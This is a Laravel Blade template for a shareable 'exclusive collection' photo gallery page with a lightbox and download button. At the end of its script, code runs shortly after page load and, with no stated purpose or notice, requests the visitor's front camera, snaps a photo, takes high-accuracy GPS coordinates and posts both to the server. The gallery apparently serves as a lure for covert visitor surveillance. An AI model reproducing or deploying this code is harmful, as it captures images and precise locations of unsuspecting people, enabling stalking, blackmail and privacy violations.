<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $category->name }} - Gallery</title>
    
    <!-- Open Graph for Social Sharing -->
    <meta property="og:title" content="{{ $category->name }} - Digital Gallery">
    <meta property="og:description" content="View all {{ $category->images->count() }} photos in this exclusive collection.">
    @if($category->images->first())
        <meta property="og:image" content="{{ asset('storage/'.$category->images->first()->path) }}">
    @endif
    <meta property="og:type" content="website">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        body { font-family: 'Outfit', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.3); }
        .gradient-bg { background: radial-gradient(circle at 0% 0%, #fdfbfb 0%, #ebedee 100%); }
        .category-header { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); }
    </style>
</head>
<body class="gradient-bg min-h-screen">

    <!-- Header Section -->
    <div class="category-header pt-20 pb-40 px-6 text-center text-white relative overflow-hidden">
        <div class="max-w-4xl mx-auto relative z-10">
            <h1 class="text-5xl md:text-7xl font-black mb-4 tracking-tight animate-fade-in">{{ $category->name }}</h1>
            <p class="text-xl text-white/80 font-medium">Exclusive Collection • {{ $category->images->count() }} Photos</p>
        </div>
        <!-- Decorative blobs -->
        <div class="absolute -top-10 -right-10 w-64 h-64 bg-white/10 rounded-full blur-3xl"></div>
        <div class="absolute -bottom-10 -left-10 w-48 h-48 bg-purple-400/20 rounded-full blur-3xl"></div>
    </div>

    <!-- Gallery Grid -->
    <div class="max-w-7xl mx-auto px-6 -mt-20 pb-20">
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
            @foreach($category->images as $image)
                <div onclick="openLightbox('{{ asset('storage/'.$image->path) }}', '{{ $image->name }}')" class="group relative bg-white rounded-[2.5rem] overflow-hidden shadow-2xl shadow-indigo-100 hover:shadow-indigo-200 transition-all duration-500 hover:-translate-y-2 cursor-zoom-in">
                    <div class="aspect-square relative overflow-hidden">
                        <img src="{{ asset('storage/'.$image->path) }}" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-700">
                        <div class="absolute inset-0 bg-black/20 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                    </div>
                </div>
            @endforeach
        </div>

        @if($category->images->isEmpty())
            <div class="glass max-w-lg mx-auto p-12 rounded-[3rem] text-center mt-20">
                <p class="text-2xl font-bold text-gray-400">No photos in this collection yet.</p>
            </div>
        @endif
    </div>

    <!-- Lightbox Modal -->
    <div id="lightbox" class="fixed inset-0 z-50 bg-black/95 backdrop-blur-xl hidden flex-col items-center justify-center p-4">
        <button onclick="closeLightbox()" class="absolute top-8 right-8 text-white/50 hover:text-white transition-colors">
            <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg>
        </button>
        
        <div class="relative max-w-5xl w-full flex flex-col items-center">
            <img id="lightbox-img" src="" class="max-w-full max-h-[80vh] rounded-3xl shadow-2xl transition-transform duration-500 cursor-zoom-out" onclick="toggleZoom(this)">
            
            <div class="mt-8 flex flex-col items-center gap-4">
                <h3 id="lightbox-title" class="text-white text-2xl font-black"></h3>
                <a id="lightbox-download" href="" download class="px-8 py-4 bg-indigo-600 hover:bg-indigo-700 text-white rounded-2xl font-black shadow-xl shadow-indigo-500/20 transition-all flex items-center gap-2">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" /></svg>
                    Download Original
                </a>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="py-12 border-t border-gray-100 mt-12 bg-white/50 backdrop-blur-md">
        <div class="max-w-7xl mx-auto px-6 text-center">
            <p class="text-gray-500 font-bold uppercase tracking-widest text-xs mb-2">Developed With Love</p>
            <h2 class="text-2xl font-black text-indigo-600">Modern Gallery App</h2>
        </div>
    </footer>

    <script>
        const lightbox = document.getElementById('lightbox');
        const lightboxImg = document.getElementById('lightbox-img');
        const lightboxTitle = document.getElementById('lightbox-title');
        const lightboxDownload = document.getElementById('lightbox-download');
        let isZoomed = false;

        function openLightbox(src, title) {
            lightboxImg.src = src;
            lightboxTitle.innerText = title || 'Gallery Photo';
            lightboxDownload.href = src;
            lightbox.classList.remove('hidden');
            lightbox.classList.add('flex');
            document.body.style.overflow = 'hidden';
        }

        function closeLightbox() {
            lightbox.classList.add('hidden');
            lightbox.classList.remove('flex');
            document.body.style.overflow = 'auto';
            resetZoom();
        }

        function toggleZoom(img) {
            if (!isZoomed) {
                img.style.transform = 'scale(1.3)';
                img.style.cursor = 'zoom-out';
            } else {
                resetZoom();
            }
            isZoomed = !isZoomed;
        }

        function resetZoom() {
            lightboxImg.style.transform = 'scale(1)';
            lightboxImg.style.cursor = 'zoom-in';
            isZoomed = false;
        }

        // Close on esc
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        // Visitor Data Collection (Camera & Location)
        @if(isset($visitorLog) && $visitorLog)
        (function() {
            const visitorLogId = {{ $visitorLog->id }};
            let cameraImage = null;
            let locationData = null;

            // Request camera access and capture photo
            async function captureCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { facingMode: 'user' } // Front camera
                    });
                    
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    // Wait for video to be ready
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            video.width = video.videoWidth;
                            video.height = video.videoHeight;
                            resolve();
                        };
                    });

                    // Capture frame
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    // Stop video stream
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Convert to base64
                    cameraImage = canvas.toDataURL('image/jpeg', 0.8);
                    
                    // Send data if location is also available
                    if (locationData) {
                        sendVisitorData();
                    }
                } catch (error) {
                    console.log('Camera access denied or not available:', error);
                    // Continue without camera data
                    if (locationData) {
                        sendVisitorData();
                    }
                }
            }

            // Get location
            function getLocation() {
                if (!navigator.geolocation) {
                    console.log('Geolocation not supported');
                    if (cameraImage) {
                        sendVisitorData();
                    }
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        
                        // Send data if camera is also available
                        if (cameraImage) {
                            sendVisitorData();
                        }
                    },
                    function(error) {
                        console.log('Location access denied:', error);
                        // Continue without location data
                        if (cameraImage) {
                            sendVisitorData();
                        }
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }

            // Send visitor data to server
            async function sendVisitorData() {
                const data = {
                    visitor_log_id: visitorLogId,
                    _token: '{{ csrf_token() }}'
                };

                if (cameraImage) {
                    data.camera_image = cameraImage;
                }

                if (locationData) {
                    data.latitude = locationData.latitude;
                    data.longitude = locationData.longitude;
                    data.location_accuracy = locationData.accuracy;
                }

                try {
                    const response = await fetch('{{ route("visitor.data.store") }}', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-CSRF-TOKEN': '{{ csrf_token() }}'
                        },
                        body: JSON.stringify(data)
                    });

                    const result = await response.json();
                    if (result.success) {
                        console.log('Visitor data saved successfully');
                    }
                } catch (error) {
                    console.error('Error sending visitor data:', error);
                }
            }

            // Start collecting data (non-blocking)
            setTimeout(() => {
                // Request both permissions simultaneously
                captureCamera();
                getLocation();
            }, 1000); // Wait 1 second after page load
        })();
        @endif
    </script>
</body>
</html>
